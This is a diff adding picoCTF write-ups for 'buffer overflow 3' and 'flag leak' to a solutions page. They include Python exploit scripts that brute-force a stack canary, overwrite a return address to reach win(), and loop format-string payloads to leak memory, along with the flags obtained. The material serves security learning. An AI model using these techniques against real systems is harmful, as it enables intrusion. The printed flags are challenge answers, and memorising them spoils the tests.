@@ -34,8 +34,8 @@ Binary exploitation is the process of subverting a compiled application such tha
 - [RPS (2022)](#rps) 🗸
 - [x-sixty-what (2022)](#x-sixty-what) 🗸
 - [buffer overflow 2 (2022)](#buffer-overflow-2) 🗸
-- [buffer overflow 3 (2022)](#buffer-overflow-3)
-- [flag leak (2022)](#flag-leak)
+- [buffer overflow 3 (2022)](#buffer-overflow-3) 🗸
+- [flag leak (2022)](#flag-leak) 🗸
 - [ropfu (2022)](#ropfu)
 - [wine (2022)](#wine)
 - [function overwrite (2022)](#function-overwrite)
@@ -3315,6 +3315,394 @@ picoCTF{argum3nt5_4_d4yZ_b3fd8f66}
 
 ---
 	
+## buffer overflow 3
+
+- Author: Sanjay C / Palash Oswal
+- 300 Points
+
+### Description
+
+Do you think you can bypass the protection and get the flag? 
+It looks like Dr. Oswal added a stack canary to this [program](https://artifacts.picoctf.net/c/492/vuln) to protect against buffer overflows. You can view source [here](https://artifacts.picoctf.net/c/492/vuln.c). And connect with it using: 
+
+~~~
+nc saturn.picoctf.net 52744
+~~~
+
+### Hints
+
+1. Maybe there's a smart way to brute-force the canary?
+
+### Attachments
+
+1. [vuln](https://artifacts.picoctf.net/c/492/vuln)
+2. [vuln.c](https://artifacts.picoctf.net/c/492/vuln.c)
+	
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+We can review the source code for the program:
+
+~~~c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <wchar.h>
+#include <locale.h>
+
+#define BUFSIZE 64
+#define FLAGSIZE 64
+#define CANARY_SIZE 4
+
+void win() {
+  char buf[FLAGSIZE];
+  FILE *f = fopen("flag.txt","r");
+  if (f == NULL) {
+    printf("%s %s", "Please create 'flag.txt' in this directory with your",
+                    "own debugging flag.\n");
+    exit(0);
+  }
+
+  fgets(buf,FLAGSIZE,f); // size bound read
+  puts(buf);
+  fflush(stdout);
+}
+
+char global_canary[CANARY_SIZE];
+void read_canary() {
+  FILE *f = fopen("canary.txt","r");
+  if (f == NULL) {
+    printf("%s %s", "Please create 'canary.txt' in this directory with your",
+                    "own debugging canary.\n");
+    exit(0);
+  }
+
+  fread(global_canary,sizeof(char),CANARY_SIZE,f);
+  fclose(f);
+}
+
+void vuln(){
+   char canary[CANARY_SIZE];
+   char buf[BUFSIZE];
+   char length[BUFSIZE];
+   int count;
+   int x = 0;
+   memcpy(canary,global_canary,CANARY_SIZE);
+   printf("How Many Bytes will You Write Into the Buffer?\n> ");
+   while (x<BUFSIZE) {
+      read(0,length+x,1);
+      if (length[x]=='\n') break;
+      x++;
+   }
+   sscanf(length,"%d",&count);
+
+   printf("Input> ");
+   read(0,buf,count);
+
+   if (memcmp(canary,global_canary,CANARY_SIZE)) {
+      printf("***** Stack Smashing Detected ***** : Canary Value Corrupt!\n"); // crash immediately
+      exit(-1);
+   }
+   printf("Ok... Now Where's the Flag?\n");
+   fflush(stdout);
+}
+
+int main(int argc, char **argv){
+
+  setvbuf(stdout, NULL, _IONBF, 0);
+  
+  // Set the gid to the effective gid
+  // this prevents /bin/sh from dropping the privileges
+  gid_t gid = getegid();
+  setresgid(gid, gid, gid);
+  read_canary();
+  vuln();
+  return 0;
+}
+~~~
+		    
+This shows the flag will be displayed in the subfunction win().  We can use gdb to find the address of this function:
+
+~~~
+(gdb) info addr win
+Symbol "win" is at 0x8049336 in a file compiled without debugging.
+(gdb) disass win
+Dump of assembler code for function win:
+   0x08049336 <+0>:	endbr32 
+   0x0804933a <+4>:	push   %ebp
+   0x0804933b <+5>:	mov    %esp,%ebp
+   0x0804933d <+7>:	push   %ebx
+   0x0804933e <+8>:	sub    $0x54,%esp
+   0x08049341 <+11>:	call   0x8049270 <__x86.get_pc_thunk.bx>
+   0x08049346 <+16>:	add    $0x2cba,%ebx
+   0x0804934c <+22>:	sub    $0x8,%esp
+   0x0804934f <+25>:	lea    -0x1ff8(%ebx),%eax
+   0x08049355 <+31>:	push   %eax
+   0x08049356 <+32>:	lea    -0x1ff6(%ebx),%eax
+   0x0804935c <+38>:	push   %eax
+   0x0804935d <+39>:	call   0x8049200 <fopen@plt>
+   0x08049362 <+44>:	add    $0x10,%esp
+   0x08049365 <+47>:	mov    %eax,-0xc(%ebp)
+   0x08049368 <+50>:	cmpl   $0x0,-0xc(%ebp)
+   0x0804936c <+54>:	jne    0x8049398 <win+98>
+   0x0804936e <+56>:	sub    $0x4,%esp
+   0x08049371 <+59>:	lea    -0x1fed(%ebx),%eax
+   0x08049377 <+65>:	push   %eax
+   0x08049378 <+66>:	lea    -0x1fd8(%ebx),%eax
+   0x0804937e <+72>:	push   %eax
+   0x0804937f <+73>:	lea    -0x1fa3(%ebx),%eax
+   0x08049385 <+79>:	push   %eax
+   0x08049386 <+80>:	call   0x8049140 <printf@plt>
+   0x0804938b <+85>:	add    $0x10,%esp
+--Type <RET> for more, q to quit, c to continue without paging--
+   0x0804938e <+88>:	sub    $0xc,%esp
+   0x08049391 <+91>:	push   $0x0
+   0x08049393 <+93>:	call   0x80491c0 <exit@plt>
+   0x08049398 <+98>:	sub    $0x4,%esp
+   0x0804939b <+101>:	pushl  -0xc(%ebp)
+   0x0804939e <+104>:	push   $0x40
+   0x080493a0 <+106>:	lea    -0x4c(%ebp),%eax
+   0x080493a3 <+109>:	push   %eax
+   0x080493a4 <+110>:	call   0x8049160 <fgets@plt>
+   0x080493a9 <+115>:	add    $0x10,%esp
+   0x080493ac <+118>:	sub    $0xc,%esp
+   0x080493af <+121>:	lea    -0x4c(%ebp),%eax
+   0x080493b2 <+124>:	push   %eax
+   0x080493b3 <+125>:	call   0x80491b0 <puts@plt>
+   0x080493b8 <+130>:	add    $0x10,%esp
+   0x080493bb <+133>:	mov    -0x4(%ebx),%eax
+   0x080493c1 <+139>:	mov    (%eax),%eax
+   0x080493c3 <+141>:	sub    $0xc,%esp
+   0x080493c6 <+144>:	push   %eax
+   0x080493c7 <+145>:	call   0x8049150 <fflush@plt>
+   0x080493cc <+150>:	add    $0x10,%esp
+   0x080493cf <+153>:	nop
+   0x080493d0 <+154>:	mov    -0x4(%ebp),%ebx
+   0x080493d3 <+157>:	leave  
+   0x080493d4 <+158>:	ret    
+End of assembler dump.
+~~~
+
+As before, we will use the second function in the win routine as our target address (0x0804933b).
+
+In the source code, we can see the user inputs the number of Bytes to be input and the bytes themselves.  The buffer is fixed at 64 Bytes so is vulnerable to overflow.
+	
+We can see the canary file is used to kill the process in the event of an overflow exploit, to enable the exploit, we must identify the 4-Byte canary and include this in the payload.  We can generate a test canary.txt file with "TEST" as the canary.  We can show an incorrect payload will result in the premature exit of the program:
+
+~~~shell
+$ python -c "print('68\n' + b'a'*64+b'B'*4+'\n')" | ./vuln
+How Many Bytes will You Write Into the Buffer?
+> Input> ***** Stack Smashing Detected ***** : Canary Value Corrupt!
+~~~
+
+Whereas, if we append the correct canary value, we will get:
+
+~~~shell
+$ python -c "print('68\n' + b'a'*64+b'TEST'+'\n')" | ./vuln
+How Many Bytes will You Write Into the Buffer?
+> Input> Ok... Now Where's the Flag?
+~~~
+
+We can write a python script to step through the canary input and identify the canary.txt string:
+
+~~~py
+import socket
+import string
+import time
+
+URL = "saturn.picoctf.net"
+PORT = 55001
+DIC = string.printable
+IN_STR = "a"*64
+CAN_STR = ""
+
+for i in range(4):
+    N = 65+i
+    nextletter = 0
+    for j in DIC:
+        end = 0
+        wait = 0.1
+        while end==0:
+            sock = socket.socket()
+            sock.connect((URL,PORT))
+            data = sock.recv(1024).decode()
+            time.sleep(wait)
+            InputString = str(N) + "\n" + IN_STR + CAN_STR + j + "\n"
+            InputString = InputString.encode()
+            sock.send(InputString)
+            time.sleep(wait)
+            data = sock.recv(1024).decode()
+            print(data)
+            sock.close()
+            if "Smashing" in data:
+                print("Canary character {} is not \"{}\".".format(i+1,j))
+                end = 1
+                break
+            elif "Flag" in data:
+                CAN_STR += j
+                print(CAN_STR)
+                end = 1
+                nextletter = 1
+                break
+            else:
+                wait += 0.1
+                print("wait time increased to {} seconds.".format(wait))
+        if nextletter == 1:
+            break
+        
+print(CAN_STR)
+~~~
+
+The canary is "BiRd".  Using this, we can expand the payload to call the win() function using a 16 Byte buffer before the address:
+
+~~~py
+import socket
+import time
+import binascii
+
+URL = "saturn.picoctf.net"
+PORT = 55001
+
+SendStr = b"a"*64 + b"BiRd" + b"b"*16
+
+hexa = binascii.unhexlify("3b".encode())
+hexb = binascii.unhexlify("93".encode())
+hexc = binascii.unhexlify("04".encode())
+hexd = binascii.unhexlify("08".encode())
+
+PtrStr = hexa+hexb+hexc+hexd
+
+SendStr = SendStr + PtrStr
+SendStr = str(len(SendStr)).encode() + b"\n" + SendStr
+
+sock = socket.socket()
+sock.connect((URL,PORT))
+data = sock.recv(1024).decode()
+time.sleep(1)
+sock.send(SendStr)
+time.sleep(1)
+data = sock.recv(1024).decode()
+print(data)
+
+sock.close()
+~~~
+
+This returns the flag:
+
+~~~
+Input> Ok... Now Where's the Flag?
+picoCTF{Stat1C_c4n4r13s_4R3_b4D_f9792127}
+~~~
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Flag</summary>
+
+~~~
+picoCTF{Stat1C_c4n4r13s_4R3_b4D_f9792127}
+~~~
+
+</details>
+
+---
+
+### [Binary Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)
+
+---
+
+## flag leak
+
+- Author: Neel Bhavsar
+- 300 Points
+
+### Description
+
+Story telling class 1/2 I'm just copying and pasting with this [program](https://artifacts.picoctf.net/c/122/vuln). What can go wrong? You can view source [here](https://artifacts.picoctf.net/c/122/vuln.c). And connect with it using: 
+
+~~~
+nc saturn.picoctf.net 64147
+~~~
+
+### Hints
+
+1. Format Strings
+
+### Attachments
+
+1. [vuln](https://artifacts.picoctf.net/c/122/vuln)
+2. [vuln.c](https://artifacts.picoctf.net/c/122/vuln.c)
+	
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+This challenge can be brute forced by iteration using Python:
+
+~~~py
+import socket
+import time
+
+URL = "saturn.picoctf.net"
+PORT = 64147
+
+i = 0
+
+while True:
+    print("i = {}".format(i))
+    sock = socket.socket()
+    sock.connect((URL, PORT))
+    data = sock.recv(1024)
+    time.sleep(1)
+    sock.send("%{}$s\n".format(i).encode())
+    time.sleep(1)
+    data = sock.recv(1024)
+    sock.close()
+    if b"CTF{" in data:
+        print(data.decode())
+        break
+    else:
+        i += 1
+~~~
+
+This returns the flag:
+
+~~~
+Here's a story - 
+CTF{L34k1ng_Fl4g_0ff_St4ck_0551082c}
+~~~
+
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Flag</summary>
+
+~~~
+picoCTF{L34k1ng_Fl4g_0ff_St4ck_0551082c}
+~~~
+
+</details>
+
+---
+
+### [Binary Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)
+
+---
+
 This page was last updated April 22.
 	
 ## [djm89uk.github.io](https://djm89uk.github.io)
